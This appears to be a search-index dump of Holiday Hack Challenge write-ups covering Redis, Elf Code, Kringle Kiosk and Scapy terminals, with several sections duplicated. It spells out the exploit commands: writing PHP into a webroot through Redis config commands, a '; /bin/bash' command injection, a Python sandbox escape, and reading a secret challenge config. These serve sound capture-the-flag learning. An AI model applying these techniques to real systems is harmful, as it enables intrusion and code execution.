/ , and (3) the database name ( dbfilename ) is dump.rdb .","title":"Recon"},{"location":"challenges/terminal-challenges/debug-redis/#exploit","text":"In order to view the page source of index.php , we can dump the database on a php page accessible via HTTP and use said page to run php functions to print out the page source code of index.php . To do so, we need to first move the Redis DBMS onto the HTTP server so that we can access it via curl . Since we know that we're running an Apache HTTP server on Debian, we can safely assume that the web server is hosted in the default /var/www/html directory. Therefore, we can change the Redis dir to /var/www/html player@c3b0b1098583:~$ curl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html Running: redis-cli --raw -a '<password censored>' 'config' 'set' 'dir' '/var/www/html' OK player@c3b0b1098583:~$ We then need to have load the Redis database onto a php page so that we can run php commands player@c3b0b1098583:~$ curl http://localhost/maintenance.php?cmd=config,set,dbfilename,dump.php Running: redis-cli --raw -a '<password censored>' 'config' 'set' 'dbfilename' 'dump.php' OK player@c3b0b1098583:~$ Now, after saving our changes, we should be able to GET the database php page player@c3b0b1098583:~$ curl http://localhost/maintenance.php?cmd=save Running: redis-cli --raw -a '<password censored>' 'save' OK player@c3b0b1098583:~$ curl http://localhost/dump.php --output - REDIS0009\ufffd redis-ver5.0.3\ufffd \ufffdedis-bits\ufffd@\ufffdctime\ufffd(K\ufffd_used-mem\ufffd aof-preamble\ufffd\ufffd\ufffdexample2#We think there's a bug in index.phexample1The site is in maintena nce mode\ufffd\ufffd\ufffd\ufffd\ufffdA\ufffd\ufffd\ufffdplayer@c3b0b1098583:~$ player@c3b0b1098583:~$ Therefore, we can now add a php function to print the index.php page source when executed as the page loads. Since we can't modify anything on the web server, we can load the php function as the value of a key-value pair into the database player@c3b0b1098583:~$ curl 'http://localhost/maintenance.php?cmd=set,exploit,<?php+echo+readfile(\"index.php\");+?>' Running: redis-cli --raw -a '<password censored>' 'set' 'exploit' '<?php echo readfile(\"index.php\"); ?>' OK player@c3b0b1098583:~$ curl http://localhost/maintenance.php?cmd=save Running: redis-cli --raw -a '<password censored>' 'save' OK player@c3b0b1098583:~$ Let's see if it works player@c3b0b1098583:~$ curl http://localhost/dump.php --output - REDIS0009\ufffd redis-ver5.0.3\ufffd \ufffdedis-bits\ufffd@\ufffdctime\ufffd,O\ufffd_used-mem\ufffd@? aof-preamble\ufffd\ufffd\ufffdexample1The site is in maintenance modeexploit$<?php # We found the bug!! # # \\ / # .\\-/. # /\\ () () # \\/~---~\\.-~^-. # .-~^-./ | \\---. # { | } \\ # .-~\\ | /~-. # / \\ A / \\ # \\/ \\/ # echo \"Something is wrong with this page! Please use http://localhost/maintenance.php to se e if you can figure out what's going on\" ?> 48example2#We think there's a bug in index.php\ufffd\ufffdX^M\ufffd0\ufffdIplayer@c3b0b1098583:~$","title":"Exploit"},{"location":"challenges/terminal-challenges/elf-code/","text":"The Elf Code Challenge Solution I have had some professional experience building tools and apps with JS, and in all honesty, I really didn't want to spend the time referring to the elf API and debugging, especially as the levels progressively require more work. So after doing a couple levels, I started playing with the interface and found a XSS vulnerability (most likely intentionally permitted): which raised the question, \"How are the commands processed and checked against the levels' solutions?\" Since it appears that the user inputs are processed after the \"RUN\" button is clicked, I inspected the \"RUN\" button to see what the onclick event callback function is: I followed the runGame() function to the level's index.js to see if it can lead me to find how the answers area generated and checked against the user's input: The runGame() function parses checks if the user's input satisfies the level's length constraints before calling evalgame(user_code) , where user_code is the parsed user input. evalgame(user_code) then gets the level's variables and runs the user's input using the JS eval() function (which one should probably never use if avoidable ). It appears that the \"RUN\" button ultimately calls the user's input so that the interface can respond accordingly. However, it did not check if the user's input fits the solution to move on to the next level, which suggests that the answer is checked once the user's commands moves the elf avatar to the correct coordinates in the grid. So I went hunting in the Game class to see if the game has a function to check if the user's input is correct. Lo and behold, the Game class has a win_or_lose() method that does what the name suggests. If the user wins, the method uses eval to evaluate a base64 encoded JS expression. Decoding the base64 string shows that the evaluated expression sets the iframe's URI to /level[#1]_[#2]/?resourceId=[#3] , where [#1] is the level number, [#2] is the level's identifier, and [#3] is the resource identifier. Running the eval(atop(base64_string_here)) in the user's input field didn't do anything, suggesting that maybe eval is sanitized or other limitations have been set on the field. However, calling the base64 decoded expression did work: So I spent the next levels (up to the final level) decoding and inputting the base64 decoded string in eval(atop(base64_string_here)) in the levels' corresponding index.js . (I forgot to screenshot the input for level 8 before running it:) The final level had a minified index.js Prettifying the minified index.js shows a win_or_lose() function different from the previous levels. However, the win_or_lose() function still evaluates a base64 string for a successful input: Decoding the base64 string shows that to win the challenge, the game POST s an object containing an HMAC SHA256 hash of a bunch of strings associated with the game (e.g. resourceId ). Running the __POST_RESULT__ function completes the challenge.","title":"Terminal/Elf Code"},{"location":"challenges/terminal-challenges/elf-code/#the-elf-code","text":"","title":"The Elf Code"},{"location":"challenges/terminal-challenges/elf-code/#challenge","text":"","title":"Challenge"},{"location":"challenges/terminal-challenges/elf-code/#solution","text":"I have had some professional experience building tools and apps with JS, and in all honesty, I really didn't want to spend the time referring to the elf API and debugging, especially as the levels progressively require more work. So after doing a couple levels, I started playing with the interface and found a XSS vulnerability (most likely intentionally permitted): which raised the question, \"How are the commands processed and checked against the levels' solutions?\" Since it appears that the user inputs are processed after the \"RUN\" button is clicked, I inspected the \"RUN\" button to see what the onclick event callback function is: I followed the runGame() function to the level's index.js to see if it can lead me to find how the answers area generated and checked against the user's input: The runGame() function parses checks if the user's input satisfies the level's length constraints before calling evalgame(user_code) , where user_code is the parsed user input. evalgame(user_code) then gets the level's variables and runs the user's input using the JS eval() function (which one should probably never use if avoidable ). It appears that the \"RUN\" button ultimately calls the user's input so that the interface can respond accordingly. However, it did not check if the user's input fits the solution to move on to the next level, which suggests that the answer is checked once the user's commands moves the elf avatar to the correct coordinates in the grid. So I went hunting in the Game class to see if the game has a function to check if the user's input is correct. Lo and behold, the Game class has a win_or_lose() method that does what the name suggests. If the user wins, the method uses eval to evaluate a base64 encoded JS expression. Decoding the base64 string shows that the evaluated expression sets the iframe's URI to /level[#1]_[#2]/?resourceId=[#3] , where [#1] is the level number, [#2] is the level's identifier, and [#3] is the resource identifier. Running the eval(atop(base64_string_here)) in the user's input field didn't do anything, suggesting that maybe eval is sanitized or other limitations have been set on the field. However, calling the base64 decoded expression did work: So I spent the next levels (up to the final level) decoding and inputting the base64 decoded string in eval(atop(base64_string_here)) in the levels' corresponding index.js . (I forgot to screenshot the input for level 8 before running it:) The final level had a minified index.js Prettifying the minified index.js shows a win_or_lose() function different from the previous levels. However, the win_or_lose() function still evaluates a base64 string for a successful input: Decoding the base64 string shows that to win the challenge, the game POST s an object containing an HMAC SHA256 hash of a bunch of strings associated with the game (e.g. resourceId ). Running the __POST_RESULT__ function completes the challenge.","title":"Solution"},{"location":"challenges/terminal-challenges/kringle-kiosk/","text":"Kringle Kiosk Shell Welcome to our castle, we're so glad to have you with us! Come and browse the kiosk; though our app's a bit suspicious. Poke around, try running bash, please try to come discover, Need our devs who made our app pull/patch to help recover? Escape the menu by launching /bin/bash Press enter to continue... ~~~~~~~~~~~~~~~~~~~~~~~~~~~ Welcome to the North Pole! ~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 1. Map 2. Code of Conduct and Terms of Use 3. Directory 4. Print Name Badge 5. Exit Please select an item from the menu by entering a single number. Anything else might have ... unintended consequences. Enter choice [1 - 5] 4 Enter your name (Please avoid special characters, they cause some weird errors)...test ______ < test > ------ \\ \\ \\_\\_ _/_/ \\ \\__/ (oo)\\_______ (__)\\ )\\/\\ ||----w | || || Press [Enter] key to continue... Solution Since choice 4 is the option that has sanitation issues, insert common special characters found in shell commands to see what the response is: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Welcome to the North Pole! ~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 1. Map 2. Code of Conduct and Terms of Use 3. Directory 4. Print Name Badge 5. Exit Please select an item from the menu by entering a single number. Anything else might have ... unintended consequences. Enter choice [1 - 5] 4 Enter your name (Please avoid special characters, they cause some weird errors)...!@#$%^&* ()_-+= bash: -c: line 0: syntax error near unexpected token `_-+=' bash: -c: line 0: `/usr/games/cowsay -f /opt/reindeer.cow !@#$%^&*()_-+=' Press [Enter] key to continue... It appears as though the interface fails to escape parantheses, uses bash, and is running the command /usr/games/cowsay -f /opt/reindeer.cow [string] . Therefore, we can run a bash shell with a command injection that calls /bin/bash after completing the cowsay command: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Welcome to the North Pole! ~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 1. Map 2. Code of Conduct and Terms of Use 3. Directory 4. Print Name Badge 5. Exit Please select an item from the menu by entering a single number. Anything else might have ... unintended consequences. Enter choice [1 - 5] 4 Enter your name (Please avoid special characters, they cause some weird errors)...I\\'m in; /bin/bash ________ < I'm in > -------- \\ \\ \\_\\_ _/_/ \\ \\__/ (oo)\\_______ (__)\\ )\\/\\ ||----w | || || ___ _ / __| _ _ __ __ ___ ___ ___ | | \\__ \\ | +| | / _| / _| / -_) (_-< (_-< |_| |___/ \\_,_| \\__|_ \\__|_ \\___| /__/_ /__/_ _(_)_ _|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_| \"\"\" | \"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-' Type 'exit' to return to the menu. shinny@b2ffe4a3ce4e:~$ ls -alt total 32 drwxr-xr-x 1 shinny shinny 4096 Dec 29 20:03 . -rw------- 1 shinny shinny 7 Dec 29 20:03 .bash_history drwxr-xr-x 1 root root 4096 Dec 14 17:53 .. -rwxr-xr-x 1 root root 2528 Dec 6 12:24 welcome.sh -rw-r--r-- 1 root root 120 Dec 5 00:00 .bashrc -rw-r--r-- 1 shinny shinny 220 Apr 18 2019 .bash_logout -rw-r--r-- 1 shinny shinny 807 Apr 18 2019 .profile shinny@b2ffe4a3ce4e:~$","title":"Terminal/Kringle Kiosk"},{"location":"challenges/terminal-challenges/kringle-kiosk/#kringle-kiosk","text":"","title":"Kringle Kiosk"},{"location":"challenges/terminal-challenges/kringle-kiosk/#shell","text":"Welcome to our castle, we're so glad to have you with us! Come and browse the kiosk; though our app's a bit suspicious. Poke around, try running bash, please try to come discover, Need our devs who made our app pull/patch to help recover? Escape the menu by launching /bin/bash Press enter to continue... ~~~~~~~~~~~~~~~~~~~~~~~~~~~ Welcome to the North Pole! ~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 1. Map 2. Code of Conduct and Terms of Use 3. Directory 4. Print Name Badge 5. Exit Please select an item from the menu by entering a single number. Anything else might have ... unintended consequences. Enter choice [1 - 5] 4 Enter your name (Please avoid special characters, they cause some weird errors)...test ______ < test > ------ \\ \\ \\_\\_ _/_/ \\ \\__/ (oo)\\_______ (__)\\ )\\/\\ ||----w | || || Press [Enter] key to continue...","title":"Shell"},{"location":"challenges/terminal-challenges/kringle-kiosk/#solution","text":"Since choice 4 is the option that has sanitation issues, insert common special characters found in shell commands to see what the response is: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Welcome to the North Pole! ~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 1. Map 2. Code of Conduct and Terms of Use 3. Directory 4. Print Name Badge 5. Exit Please select an item from the menu by entering a single number. Anything else might have ... unintended consequences. Enter choice [1 - 5] 4 Enter your name (Please avoid special characters, they cause some weird errors)...!@#$%^&* ()_-+= bash: -c: line 0: syntax error near unexpected token `_-+=' bash: -c: line 0: `/usr/games/cowsay -f /opt/reindeer.cow !@#$%^&*()_-+=' Press [Enter] key to continue... It appears as though the interface fails to escape parantheses, uses bash, and is running the command /usr/games/cowsay -f /opt/reindeer.cow [string] . Therefore, we can run a bash shell with a command injection that calls /bin/bash after completing the cowsay command: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Welcome to the North Pole! ~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 1. Map 2. Code of Conduct and Terms of Use 3. Directory 4. Print Name Badge 5. Exit Please select an item from the menu by entering a single number. Anything else might have ... unintended consequences. Enter choice [1 - 5] 4 Enter your name (Please avoid special characters, they cause some weird errors)...I\\'m in; /bin/bash ________ < I'm in > -------- \\ \\ \\_\\_ _/_/ \\ \\__/ (oo)\\_______ (__)\\ )\\/\\ ||----w | || || ___ _ / __| _ _ __ __ ___ ___ ___ | | \\__ \\ | +| | / _| / _| / -_) (_-< (_-< |_| |___/ \\_,_| \\__|_ \\__|_ \\___| /__/_ /__/_ _(_)_ _|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_| \"\"\" | \"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-' Type 'exit' to return to the menu. shinny@b2ffe4a3ce4e:~$ ls -alt total 32 drwxr-xr-x 1 shinny shinny 4096 Dec 29 20:03 . -rw------- 1 shinny shinny 7 Dec 29 20:03 .bash_history drwxr-xr-x 1 root root 4096 Dec 14 17:53 .. -rwxr-xr-x 1 root root 2528 Dec 6 12:24 welcome.sh -rw-r--r-- 1 root root 120 Dec 5 00:00 .bashrc -rw-r--r-- 1 shinny shinny 220 Apr 18 2019 .bash_logout -rw-r--r-- 1 shinny shinny 807 Apr 18 2019 .profile shinny@b2ffe4a3ce4e:~$","title":"Solution"},{"location":"challenges/terminal-challenges/scapy-prepper/","text":"Scapy Prepper Shell \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557 \u2551 ___ ___ ___ ___ ___ _ _ _____ ___ _ ___ _ _____ _____ \u2551 \u2551 | _ \\ _ \\ __/ __| __| \\| |_ _| | _ \\/_\\ / __| |/ / __|_ _| \u2551 \u2551 | _/ / _|\\__ \\ _|| .` | | | | _/ _ \\ (__| ' <| _| | | \u2551 \u2551 |_| |_|_\\___|___/___|_|\\_| |_| |_|/_/ \\_\\___|_|\\_\\___| |_| \u2551 \u2551 ___ \u2551 \u2551 | _ \\_ _ ___ _ __ _ __ ___ _ _ \u2551 \u2551 | _/ '_/ -_) '_ \\ '_ \\/ -_) '_| \u2551 \u2551 |_| |_| \\___| .__/ .__/\\___|_| \u2551 \u2551 |_| |_| \u2551 \u2551 (Packets prepared with scapy) \u2551 \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d Type \"yes\" to begin. yes \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557 \u2551 HELP MENU: \u2551 \u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 \u2551 'help()' prints the present packet scapy help. \u2551 \u2551 'help_menu()' prints the present packet scapy help. \u2551 \u2551 'task.get()' prints the current task to be solved. \u2551 \u2551 'task.task()' prints the current task to be solved. \u2551 \u2551 'task.help()' prints help on how to complete your task \u2551 \u2551 'task.submit(answer)' submit an answer to the current task \u2551 \u2551 'task.answered()' print through all successfully answered. \u2551 \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d >>> task.get() Welcome to the \"Present Packet Prepper\" interface! The North Pole could use your help prep aring present packets for shipment. Start by running the task.submit() function passing in a string argument of 'start'. Type task.help() for help on this question. >>> Solution task.submit('start') Submit the class object of the scapy module that sends packets at layer 3 of the OSI model: task.submit(send) Submit the class object of the scapy module that sniffs network packets and returns those packets in a list: task.submit(sniff) Submit the NUMBER only from the choices below that would successfully send a TCP packet and then return the first sniffed response packet to be stored in a variable named \"pkt\" ``` pkt = sr1(IP(dst=\"127.0.0.1\")/TCP(dport=20)) pkt = sniff(IP(dst=\"127.0.0.1\")/TCP(dport=20)) pkt = sendp(IP(dst=\"127.0.0.1\")/TCP(dport=20)) `` : task.submit(1)` Submit the class object of the scapy module that can read pcap or pcapng files and return a list of packets: task.submit(rdpcap) The variable UDP_PACKETS contains a list of UDP packets. Submit the NUMBER only from the choices below that correctly prints a summary of UDP_PACKETS ``` UDP_PACKETS.print() UDP_PACKETS.show() UDP_PACKETS.list() `` : task.submit(2)` Submit only the first packet found in UDP_PACKETS : task.submit(UDP_PACKETS[0]) Submit only the entire TCP layer of the second packet in TCP_PACKETS : task.submit(TCP_PACKETS[1][TCP]) Change the source IP address of the first packet found in UDP_PACKETS to 127.0.0.1 and then submit this modified packet: >>> UDP_PACKETS[0][IP].dst = '127.0.0.1' >>> task.submit(UDP_PACKETS[0]) Submit the password task.submit('elf_password') of the user alabaster as found in the packet list TCP_PACKETS : >>> TCP_PACKETS.show() 0000 Ether / IP / TCP 192.168.0.114:1137 > 192.168.0.193:ftp S 0001 Ether / IP / TCP 192.168.0.193:ftp > 192.168.0.114:1137 SA 0002 Ether / IP / TCP 192.168.0.114:1137 > 192.168.0.193:ftp A 0003 Ether / IP / TCP 192.168.0.193:ftp > 192.168.0.114:1137 PA / Raw 0004 Ether / IP / TCP 192.168.0.114:1137 > 192.168.0.193:ftp PA / Raw 0005 Ether / IP / TCP 192.168.0.193:ftp > 192.168.0.114:1137 PA / Raw 0006 Ether / IP / TCP 192.168.0.114:1137 > 192.168.0.193:ftp PA / Raw 0007 Ether / IP / TCP 192.168.0.193:ftp > 192.168.0.114:1137 PA / Raw >>> [p[Raw].load for p in TCP_PACKETS if Raw in p] [b'220 North Pole FTP Server\\r\\n', b'USER alabaster\\r', b'331 Password required for alabas ter.\\r', b'PASS echo\\r\\n', b'230 User alabaster logged in.\\r'] >>> task.submit('echo') The ICMP_PACKETS variable contains a packet list of several icmp echo-request and icmp echo-reply packets. Submit only the ICMP chksum value from the second packet in the ICMP_PACKETS list. >>> ICMP_PACKETS.show() 0000 Ether / IP / ICMP 10.2.2.123 > 10.21.23.12 echo-request 0 / Raw 0001 Ether / IP / ICMP 10.21.23.12 > 10.21.23.12 echo-reply 0 / Raw 0002 Ether / IP / ICMP 10.2.2.123 > 10.21.23.12 echo-request 0 / Raw 0003 Ether / IP / ICMP 10.21.23.12 > 10.21.23.12 echo-reply 0 / Raw >>> ICMP_PACKETS[1][ICMP] <ICMP type=echo-reply code=0 chksum=0x4c44 id=0x6d38 seq=0x1 unused='' |<Raw load='L=\\xa 7^\\x00\\x00\\x00\\x00\\x88\\x13\\x0c\\x00\\x00\\x00\\x00\\x00\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19 \\x1a\\x1b\\x1c\\x1d\\x1e\\x1f !\"#$%&\\'()*+,-./01234567' |>> >>> task.submit(0x4c44) Submit the number of the choice below that would correctly create a ICMP echo request packet with a destination IP of 127.0.0.1 stored in the variable named \"pkt\" ```` pkt = Ether(src='127.0.0.1')/ICMP(type=\"echo-request\") pkt = IP(src='127.0.0.1')/ICMP(type=\"echo-reply\") pkt = IP(dst='127.0.0.1')/ICMP(type=\"echo-request\") ``` : task.submit(3)` Create and then submit a UDP packet with a dport of 5000 and a dst IP of 127.127.127.127. (all other packet attributes can be unspecified) >>> l3 = IP(dst='127.127.127.127') >>> l4 = UDP(dport=5000) >>> packet = l3/l4 >>> task.submit(packet) Create and then submit a UDP packet with a dport of 53, a dst IP of 127.2.3.4, and is a DNS query with a qname of \"elveslove.santa\". (all other packet attributes can be unspecified) >>> l3 = IP(dst='127.2.3.4') >>> l4 = UDP(dport=53) >>> l7 = DNS(qd=DNSQR(qname='elveslove.santa')) >>> packet = l3/l4/l7 >>> task.submit(packet) The variable ARP_PACKETS contains an ARP request and response packets. The ARP response (the second packet) has 3 incorrect fields in the ARP layer. Correct the second packet in ARP_PACKETS to be a proper ARP response and then task.submit(ARP_PACKETS) for inspection. >>> ARP_PACKETS.show() 0000 Ether / ARP who has 192.168.0.1 says 192.168.0.114 0001 Ether / ARP None 192.168.0.1 > 192.168.0.114 / Padding >>> ARP_PACKETS[1][ARP] <ARP hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=None hwsrc=ff:ff:ff:ff:ff:ff psrc=192.168.0. 1 hwdst=ff:ff:ff:ff:ff:ff pdst=192.168.0.114 |<Padding load='\\xc0\\xa8\\x00r' |>> >>> ARP_PACKETS[1][ARP].op = 2 # reply >>> ARP_PACKETS[1][ARP].hwdst = ARP_PACKETS[0][ARP].hwsrc >>> ARP_PACKETS[1][Ether] <Ether dst=00:16:ce:6e:8b:24 src=00:13:46:0b:22:ba type=ARP |<ARP hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=ff:ff:ff:ff:ff:ff psrc=192.168.0.1 hwdst=00:16:ce:6e:8b:24 p dst=192.168.0.114 |<Padding load='\\xc0\\xa8\\x00r' |>>> >>> ARP_PACKETS[1][ARP].hwsrc = ARP_PACKETS[1][Ether].src >>> task.submit(ARP_PACKETS) Great, you prepared all the present packets! Congratulations, all pretty present packets properly prepared for processing! /bin/bash: /home/elf/runtoanswer: No such file or directory Fun fact The python shell is not secure: Great, you prepared all the present packets! Congratulations, all pretty present packets properly prepared for processing! /bin/bash: /home/elf/runtoanswer: No such file or directory >>> import os; os.system('/bin/bash') elf@e5204f3baace:~$ ll total 28 drwxr-xr-x 1 elf elf 4096 Jan 6 04:28 ./ drwxr-xr-x 1 root root 4096 Dec 6 12:27 ../ -rw-r--r-- 1 elf elf 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 elf elf 3770 Dec 5 00:00 .bashrc drwxr-xr-x 3 elf elf 4096 Jan 6 04:28 .cache/ -rw-r--r-- 1 elf elf 807 Apr 4 2018 .profile elf@e5204f3baace:~$ find / -name *runtoanswer* 2>/dev/null /etc/runtoanswer.yaml elf@e5204f3baace:~$ file /etc/runtoanswer.yaml /etc/runtoanswer.yaml: ASCII text elf@e5204f3baace:~$ cat /etc/runtoanswer.yaml # This is the config file for runtoanswer, where you can set up your challenge! --- # This is the completionSecret from the Content sheet - don't tell the user this! key: f8faa6e627ad475fb0ef040a8c972a01 # The answer that the user is expected to enter - case sensitive answer: \"5549680958006376\" # A prompt that is displayed if the user runs this interactively (they might # not see this - answers can be entered as an argument) prompt: \"What is the answer?\\n> \" # Optional: a time, in seconds, to delay before validating the answer (to # prevent guessing) # delay: 5elf@e5204f3baace:~$","title":"Terminal/Scapy Prepper"},{"location":"challenges/terminal-challenges/scapy-prepper/#scapy-prepper","text":"","title":"Scapy Prepper"},{"location":"challenges/terminal-challenges/scapy-prepper/#shell","text":"\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557 \u2551 ___ ___ ___ ___ ___ _ _ _____ ___ _ ___ _ _____ _____ \u2551 \u2551 | _ \\ _ \\ __/ __| __| \\| |_ _| | _ \\/_\\ / __| |/ / __|_ _| \u2551 \u2551 | _/ / _|\\__ \\ _|| .` | | | | _/ _ \\ (__| ' <| _| | | \u2551 \u2551 |_| |_|_\\___|___/___|_|\\_| |_| |_|/_/ \\_\\___|_|\\_\\___| |_| \u2551 \u2551 ___ \u2551 \u2551 | _ \\_ _ ___ _ __ _ __ ___ _ _ \u2551 \u2551 | _/ '_/ -_) '_ \\ '_ \\/ -_) '_| \u2551 \u2551 |_| |_| \\___| .__/ .__/\\___|_| \u2551 \u2551 |_| |_| \u2551 \u2551 (Packets prepared with scapy) \u2551 \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d Type \"yes\" to begin. yes \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557 \u2551 HELP MENU: \u2551 \u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 \u2551 'help()' prints the present packet scapy help. \u2551 \u2551 'help_menu()' prints the present packet scapy help. \u2551 \u2551 'task.get()' prints the current task to be solved. \u2551 \u2551 'task.task()' prints the current task to be solved. \u2551 \u2551 'task.help()' prints help on how to complete your task \u2551 \u2551 'task.submit(answer)' submit an answer to the current task \u2551 \u2551 'task.answered()' print through all successfully answered. \u2551 \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d >>> task.get() Welcome to the \"Present Packet Prepper\" interface! The North Pole could use your help prep aring present packets for shipment. Start by running the task.submit() function passing in a string argument of 'start'. Type task.help() for help on this question. >>>","title":"Shell"},{"location":"challenges/terminal-challenges/scapy-prepper/#solution","text":"task.submit('start') Submit the class object of the scapy module that sends packets at layer 3 of the OSI model: task.submit(send) Submit the class object of the scapy module that sniffs network packets and returns those packets in a list: task.submit(sniff) Submit the NUMBER only from the choices below that would successfully send a TCP packet and then return the first sniffed response packet to be stored in a variable named \"pkt\" ``` pkt = sr1(IP(dst=\"127.0.0.1\")/TCP(dport=20)) pkt = sniff(IP(dst=\"127.0.0.1\")/TCP(dport=20)) pkt = sendp(IP(dst=\"127.0.0.1\")/TCP(dport=20)) `` : task.submit(1)` Submit the class object of the scapy module that can read pcap or pcapng files and return a list of packets: task.submit(rdpcap) The variable UDP_PACKETS contains a list of UDP packets. Submit the NUMBER only from the choices below that correctly prints a summary of UDP_PACKETS ``` UDP_PACKETS.print() UDP_PACKETS.show() UDP_PACKETS.list() `` : task.submit(2)` Submit only the first packet found in UDP_PACKETS : task.submit(UDP_PACKETS[0]) Submit only the entire TCP layer of the second packet in TCP_PACKETS : task.submit(TCP_PACKETS[1][TCP]) Change the source IP address of the first packet found in UDP_PACKETS to 127.0.0.1 and then submit this modified packet: >>> 